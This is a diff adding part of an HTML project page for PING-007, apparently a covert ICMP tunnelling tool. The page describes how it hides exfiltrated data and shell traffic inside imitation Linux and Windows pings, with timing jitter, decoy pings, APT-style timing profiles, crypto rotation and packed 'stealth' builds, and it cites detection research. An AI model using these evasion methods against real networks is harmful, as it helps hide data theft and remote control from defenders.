+          Data zone: <span style="color:var(--gold)">XOR'd into bytes [16:56] · 38B usable</span><br>
+          Frag capacity: <span style="color:var(--gold)">34B/pkt (4B frag header embedded)</span>
+        </div>
+      </div>
+      <div style="background:#0a0a0a;border:1px solid #1a1a1a;border-radius:8px;padding:20px;">
+        <div style="font-family:var(--mono);font-size:10px;color:var(--gold);letter-spacing:2px;margin-bottom:12px;">--signature windows</div>
+        <div style="font-family:var(--mono);font-size:11px;color:#555;line-height:2;">
+          Total size: <span style="color:var(--silver)">40 bytes</span><br>
+          TTL: <span style="color:var(--silver)">128</span><br>
+          Payload: <span style="color:var(--silver)">32 bytes</span><br>
+          Structure: <span style="color:var(--silver)">"abcdefghijklmnopqrstuvwabcdefghi"</span><br>
+          Data zone: <span style="color:var(--gold)">XOR'd into all 32 bytes · 22B max single-pkt</span><br>
+          Frag capacity: <span style="color:var(--gold)">18B/pkt (4B frag header embedded)</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="grid-3" style="margin-bottom:48px;">
+      <div class="feat">
+        <h3>OS payload mimicry</h3>
+        <p style="font-family:var(--mono);font-size:12px;color:var(--silver);">Linux: 56-byte, 0x10,0x11,…<br>Windows: 32-byte, abcdefgh…<br>Data XOR'd into real pattern<br>Always 64/40 bytes on the wire</p>
+      </div>
+      <div class="feat">
+        <h3>Multi-packet reassembly</h3>
+        <p style="font-family:var(--mono);font-size:12px;color:var(--silver);">Large payloads → N×64-byte pings<br>4-byte frag header hidden in XOR zone<br>[0xA7][session][frag_id][total]<br>Receiver reassembles before decrypt</p>
+      </div>
+      <div class="feat">
+        <h3>TTL + identifier spoofing</h3>
+        <p style="font-family:var(--mono);font-size:12px;color:var(--silver);">TTL: 64 (Linux) / 128 (Windows)<br>ICMP ID: getpid() (Linux) / 0x0001 (Windows)<br>Seq: starts at 1, +1 per packet<br>Identical to real OS ping</p>
+      </div>
+      <div class="feat">
+        <h3>Human timing simulation</h3>
+        <p style="font-family:var(--mono);font-size:12px;color:var(--silver);"><code style="color:var(--gold)">--human-timing / --jitter</code><br>Random 1–5s between packets<br>1s ±10% jitter within frags<br>Looks like admin doing ping -c N</p>
+      </div>
+      <div class="feat">
+        <h3>Session blending</h3>
+        <p style="font-family:var(--mono);font-size:12px;color:var(--silver);"><code style="color:var(--gold)">--decoy-pings / --after-pings</code><br>Clean OS pings wrap the data<br>Makes isolated ICMP events disappear<br>Shell: <code style="color:var(--gold)">--jitter</code> breaks beacon timing</p>
+      </div>
+      <div class="feat">
+        <h3>Per-session crypto rotation</h3>
+        <p style="font-family:var(--mono);font-size:12px;color:var(--silver);">Algorithm random at session start<br>AES / ChaCha20 / XOR-CFB-HMAC<br>First ciphertext byte varies<br>Breaks cross-session PCAP correlation</p>
+      </div>
+    </div>
+
+    <h3 style="font-family:var(--serif);font-size:22px;color:var(--white);margin-bottom:24px;">APT Timing Profiles</h3>
+    <div class="apt-grid">
+      <div class="apt-card">
+        <div class="apt-name">lazarus</div>
+        <div class="apt-group">Lazarus Group · DPRK</div>
+        <div class="apt-timing">5 min – 1 hr</div>
+        <div class="apt-sub">per chunk</div>
+      </div>
+      <div class="apt-card">
+        <div class="apt-name">apt29</div>
+        <div class="apt-group">Cozy Bear · Russia</div>
+        <div class="apt-timing">30 min – 2 hr</div>
+        <div class="apt-sub">per chunk</div>
+      </div>
+      <div class="apt-card">
+        <div class="apt-name">apt28</div>
+        <div class="apt-group">Fancy Bear · Russia</div>
+        <div class="apt-timing">10 – 30 min</div>
+        <div class="apt-sub">per chunk</div>
+      </div>
+      <div class="apt-card">
+        <div class="apt-name">equation</div>
+        <div class="apt-group">Equation Group</div>
+        <div class="apt-timing">1 – 3 days</div>
+        <div class="apt-sub">per chunk</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="divider"></div>
+
+<!-- BUILD -->
+<section id="build">
+  <div class="container">
+    <div class="sec-head">
+      <div class="sec-label">Build system</div>
+      <h2 class="sec-title">Build Targets</h2>
+    </div>
+    <div class="grid-4" style="margin-bottom:32px;">
+      <div class="spec"><div class="spec-label">Standard</div><div class="spec-val">make build<br>make build-all</div></div>
+      <div class="spec"><div class="spec-label">Stealth</div><div class="spec-val">make build-stealth<br>make build-ghost</div></div>
+      <div class="spec"><div class="spec-label">Packed</div><div class="spec-val">make build-compressed<br>make build-armored</div></div>
+      <div class="spec"><div class="spec-label">OPSEC</div><div class="spec-val">make build-no-c2<br><span style="color:#888;font-size:11px">no shell · exfil+listen intact</span></div></div>
+    </div>
+    <div class="term">
+      <div class="term-bar"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div></div>
+      <div class="term-body">
+<span class="comment"># Cross-platform: linux/amd64, linux/arm64, darwin/amd64, darwin/arm64, windows/amd64</span><br>
+<span class="prompt">$ </span><span class="cmd">make build-all</span><br><br>
+<span class="comment"># Strip symbols, -trimpath, PIE binary</span><br>
+<span class="prompt">$ </span><span class="cmd">make build-stealth</span><br><br>
+<span class="comment"># Ghost + UPX compression (smallest stealth binary)</span><br>
+<span class="prompt">$ </span><span class="cmd">make build-armored</span><br><br>
+<span class="comment"># No APT simulation module</span><br>
+<span class="prompt">$ </span><span class="cmd">make build-minimal</span><br><br>
+<span class="comment"># OPSEC variant: no interactive shell (exfil + listen intact) — -tags noc2</span><br>
+<span class="prompt">$ </span><span class="cmd">make build-no-c2</span>
+      </div>
+    </div>
+
+  </div>
+</section>
+
+<div class="divider"></div>
+
+<!-- REFERENCES -->
+<section style="background:#050505;padding:48px 0;">
+  <div class="container">
+    <div class="sec-head" style="margin-bottom:32px;">
+      <div class="sec-label">Research</div>
+      <h2 class="sec-title" style="font-size:28px;">References</h2>
+      <p class="sec-sub">All technical claims verified against published security research.</p>
+    </div>
+    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:12px;">
+      <a href="https://deepstrike.io/blog/what-is-icmp-tunneling" target="_blank" style="text-decoration:none;">
+        <div style="background:#0a0a0a;border:1px solid #1a1a1a;border-radius:6px;padding:14px 16px;transition:border-color .2s;" onmouseover="this.style.borderColor='rgba(212,175,55,0.4)'" onmouseout="this.style.borderColor='#1a1a1a'">
+          <div style="font-family:var(--mono);font-size:9px;color:var(--gold);letter-spacing:2px;margin-bottom:6px;">DEEPSTRIKE</div>
+          <div style="font-family:var(--mono);font-size:11px;color:var(--silver);">What Is ICMP Tunneling?</div>
+          <div style="font-family:var(--mono);font-size:10px;color:#444;margin-top:4px;">DLP blind spot · payload inspection limits</div>
+        </div>
+      </a>
+      <a href="https://live.paloaltonetworks.com/t5/general-topics/icmp-covert-channel-allow-only-icmp-ping-packet-that-has/td-p/259933" target="_blank" style="text-decoration:none;">
+        <div style="background:#0a0a0a;border:1px solid #1a1a1a;border-radius:6px;padding:14px 16px;" onmouseover="this.style.borderColor='rgba(212,175,55,0.4)'" onmouseout="this.style.borderColor='#1a1a1a'">
+          <div style="font-family:var(--mono);font-size:9px;color:var(--gold);letter-spacing:2px;margin-bottom:6px;">PALO ALTO LIVECOMMUNITY</div>
+          <div style="font-family:var(--mono);font-size:11px;color:var(--silver);">ICMP Covert Channel — payload patterns</div>
+          <div style="font-family:var(--mono);font-size:10px;color:#444;margin-top:4px;">Windows abcdefgh… payload confirmed</div>
+        </div>
+      </a>
+      <a href="https://labs.jumpsec.com/covert-channels-misusing-icmp-protocol-for-file-transfers-with-scapy/" target="_blank" style="text-decoration:none;">
+        <div style="background:#0a0a0a;border:1px solid #1a1a1a;border-radius:6px;padding:14px 16px;" onmouseover="this.style.borderColor='rgba(212,175,55,0.4)'" onmouseout="this.style.borderColor='#1a1a1a'">
+          <div style="font-family:var(--mono);font-size:9px;color:var(--gold);letter-spacing:2px;margin-bottom:6px;">JUMPSEC LABS</div>
+          <div style="font-family:var(--mono);font-size:11px;color:var(--silver);">Misusing ICMP for covert file transfers</div>
+          <div style="font-family:var(--mono);font-size:10px;color:#444;margin-top:4px;">Chunking · OS signatures · detectability</div>
+        </div>
+      </a>
+      <a href="https://www.vectra.ai/detections/icmp-tunnel" target="_blank" style="text-decoration:none;">
+        <div style="background:#0a0a0a;border:1px solid #1a1a1a;border-radius:6px;padding:14px 16px;" onmouseover="this.style.borderColor='rgba(212,175,55,0.4)'" onmouseout="this.style.borderColor='#1a1a1a'">
+          <div style="font-family:var(--mono);font-size:9px;color:var(--gold);letter-spacing:2px;margin-bottom:6px;">VECTRA AI</div>
+          <div style="font-family:var(--mono);font-size:11px;color:var(--silver);">ICMP Tunnel — detection signals</div>
+          <div style="font-family:var(--mono);font-size:10px;color:#444;margin-top:4px;">NDR behavioral detection methods</div>
+        </div>
+      </a>
+      <a href="https://www.trisul.org/blog/detecting-icmp-covert-channels-through-payload-analysis/" target="_blank" style="text-decoration:none;">
+        <div style="background:#0a0a0a;border:1px solid #1a1a1a;border-radius:6px;padding:14px 16px;" onmouseover="this.style.borderColor='rgba(212,175,55,0.4)'" onmouseout="this.style.borderColor='#1a1a1a'">
+          <div style="font-family:var(--mono);font-size:9px;color:var(--gold);letter-spacing:2px;margin-bottom:6px;">TRISUL ANALYTICS</div>
+          <div style="font-family:var(--mono);font-size:11px;color:var(--silver);">Detecting ICMP covert channels</div>
+          <div style="font-family:var(--mono);font-size:10px;color:#444;margin-top:4px;">Entropy analysis · payload inspection</div>
+        </div>
+      </a>
+      <a href="https://levelblue.com/en-us/resources/blogs/spiderlabs-blog/backdoor-at-the-end-of-the-icmp-tunnel/" target="_blank" style="text-decoration:none;">
+        <div style="background:#0a0a0a;border:1px solid #1a1a1a;border-radius:6px;padding:14px 16px;" onmouseover="this.style.borderColor='rgba(212,175,55,0.4)'" onmouseout="this.style.borderColor='#1a1a1a'">
+          <div style="font-family:var(--mono);font-size:9px;color:var(--gold);letter-spacing:2px;margin-bottom:6px;">TRUSTWAVE SPIDERLABS</div>
+          <div style="font-family:var(--mono);font-size:11px;color:var(--silver);">Pingback — ICMP backdoor malware (2021)</div>
+          <div style="font-family:var(--mono);font-size:10px;color:#444;margin-top:4px;">Real-world ICMP C2 in the wild</div>
+        </div>
+      </a>
+      <a href="https://blog.apnic.net/2022/03/31/how-to-detect-and-prevent-common-data-exfiltration-attacks/" target="_blank" style="text-decoration:none;">
+        <div style="background:#0a0a0a;border:1px solid #1a1a1a;border-radius:6px;padding:14px 16px;" onmouseover="this.style.borderColor='rgba(212,175,55,0.4)'" onmouseout="this.style.borderColor='#1a1a1a'">
+          <div style="font-family:var(--mono);font-size:9px;color:var(--gold);letter-spacing:2px;margin-bottom:6px;">APNIC BLOG</div>
+          <div style="font-family:var(--mono);font-size:11px;color:var(--silver);">Detecting data exfiltration attacks</div>
+          <div style="font-family:var(--mono);font-size:10px;color:#444;margin-top:4px;">ICMP exfil · detection & prevention</div>
+        </div>
+      </a>
+      <a href="https://infinitelogins.com/2020/12/12/using-ping-ttls-values-to-fingerprint-operating-systems/" target="_blank" style="text-decoration:none;">
+        <div style="background:#0a0a0a;border:1px solid #1a1a1a;border-radius:6px;padding:14px 16px;" onmouseover="this.style.borderColor='rgba(212,175,55,0.4)'" onmouseout="this.style.borderColor='#1a1a1a'">
+          <div style="font-family:var(--mono);font-size:9px;color:var(--gold);letter-spacing:2px;margin-bottom:6px;">INFINITELOGINS</div>
+          <div style="font-family:var(--mono);font-size:11px;color:var(--silver);">OS fingerprinting via TTL values</div>
+          <div style="font-family:var(--mono);font-size:10px;color:#444;margin-top:4px;">Linux TTL 64 · Windows TTL 128</div>
+        </div>
+      </a>
+      <a href="https://link.springer.com/content/pdf/10.1007/978-3-540-39737-3_103.pdf" target="_blank" style="text-decoration:none;">
+        <div style="background:#0a0a0a;border:1px solid #1a1a1a;border-radius:6px;padding:14px 16px;" onmouseover="this.style.borderColor='rgba(212,175,55,0.4)'" onmouseout="this.style.borderColor='#1a1a1a'">
+          <div style="font-family:var(--mono);font-size:9px;color:var(--gold);letter-spacing:2px;margin-bottom:6px;">SPRINGER · ACADEMIC</div>
+          <div style="font-family:var(--mono);font-size:11px;color:var(--silver);">Covert Channel Detection in ICMP Payload</div>
+          <div style="font-family:var(--mono);font-size:10px;color:#444;margin-top:4px;">Peer-reviewed · SVM detection approach</div>
+        </div>
+      </a>
+    </div>
+  </div>
+</section>
+
+<div class="divider"></div>
+
+<!-- FOOTER -->
+<footer>
+  <div class="container">
+    <div class="foot-inner">
+      <div class="foot-brand">
+        <div class="nav-emblem"><svg width="16" height="16" viewBox="0 0 16 16" fill="none" stroke="#000" stroke-width="1.4"><circle cx="8" cy="8" r="6"/><circle cx="8" cy="8" r="2.5" fill="#000" stroke="none"/></svg></div>
+        <div>
+          <div style="font-size:14px;font-weight:600;color:var(--white);">PING-007</div>
+          <div class="foot-copy">Covert ICMP Communication Framework</div>
+        </div>
+      </div>
+      <div class="foot-links">
+        <a href="https://github.com/franckferman/ping-007">GitHub</a>
+        <a href="https://github.com/franckferman/ping-007/blob/stable/README.md">README</a>
+        <a href="https://github.com/franckferman/ping-007/blob/stable/TODO.md">TODO</a>
+      </div>
+      <div class="foot-version">v3.0.1 · Go 1.25+ · CAP_NET_RAW</div>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
